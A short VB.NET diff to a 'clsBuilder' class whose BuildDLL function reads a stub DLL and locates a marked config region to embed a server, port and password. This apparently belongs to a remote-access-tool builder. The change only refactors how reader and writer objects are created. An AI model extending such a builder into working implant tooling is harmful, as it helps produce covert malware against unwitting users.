@@ -3,7 +3,7 @@
 Public Class clsBuilder
     Public Function BuildDLL(ByVal server As String, ByVal port As UInt16, ByVal password As String) As Byte()
         Dim stubDll As Byte() = File.ReadAllBytes("S.dll")
-        Dim BinWritter As clsArrayBinaryWritten = New clsArrayBinaryWritten()
+        Dim BinWritter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
         Dim config As Byte() = Nothing
         Dim configOffset As UInt32 = SearchForConfigOffset(stubDll)
         If configOffset = &HFFFFFFFFUI Then
@@ -29,7 +29,7 @@ Public Class clsBuilder
     End Function
 
     Private Function SearchForConfigOffset(ByVal stub As Byte()) As UInt32
-        Dim BinReader As clsArrayBinaryReader = New clsArrayBinaryReader()
+        Dim BinReader As clsArrayBinaryReader = mGlobal.GetBinReaderObj()
         For i = 0 To stub.Length - 12
             If BinReader.BufferReadDWORD(stub, i) = &HCAFEBABEUI And BinReader.BufferReadDWORD(stub, i + 4) = &HDEADBABEUI Then
                 Return i
